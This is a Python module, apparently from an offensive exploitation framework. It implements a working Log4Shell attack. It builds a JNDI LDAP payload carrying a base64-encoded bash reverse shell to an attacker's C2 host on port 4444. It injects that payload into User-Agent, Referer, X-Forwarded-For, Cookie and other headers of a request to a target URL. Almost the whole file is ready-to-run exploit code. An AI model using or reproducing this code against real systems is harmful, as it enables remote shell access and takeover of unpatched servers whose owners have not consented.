import aiohttp
import asyncio
from core.oast import oast_manager

async def exploit_log4shell(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Sprays Log4Shell JNDI payloads into Headers.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # Payload: JNDI Injection "KINETIC STRIKE"
    from core.c2_manager import c2_manager
    import urllib.parse
    
    lhost = c2_manager.get_lhost_address(url)
    
    # We assume Attacker is running JNDIExploit on 1389
    # Payload tries to spawn a shell
    cmd = f"bash -i >& /dev/tcp/{lhost}/4444 0>&1"
    import base64
    b64_cmd = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
    
    # JNDIExploit pattern
    payload = f"${{jndi:ldap://{lhost}:1389/Basic/Command/Base64/{b64_cmd}}}"
    
    attack_headers = {
        "User-Agent": payload,
        "X-Api-Version": payload,
        "Referer": payload,
        "X-Forwarded-For": payload,
        "Cookie": f"JSESSIONID={payload}"
    }
    
    final_headers.update(attack_headers)
    
    try:
        if log_callback: 
            log_callback(f"   ðŸ’£ Log4Shell: Injecting KINETIC STRIKE JNDI to {lhost}:1389...")
        
        async with aiohttp.ClientSession() as session:
             async with session.get(url, headers=final_headers, timeout=2, ssl=False, proxy=proxy) as resp:
                 pass
        
        # We assume success if no connection error, but Log4Shell is blind often.
        findings.append({
            "type": "Log4Shell Injection (Active)",
            "severity": "Critical",
            "detail": "JNDI Payload Injected.",
            "evidence": f"Targeting LHOST: {lhost}:1389",
            "remediation": "Patch Log4j."
        })
                
    except Exception: pass
    
    return findings
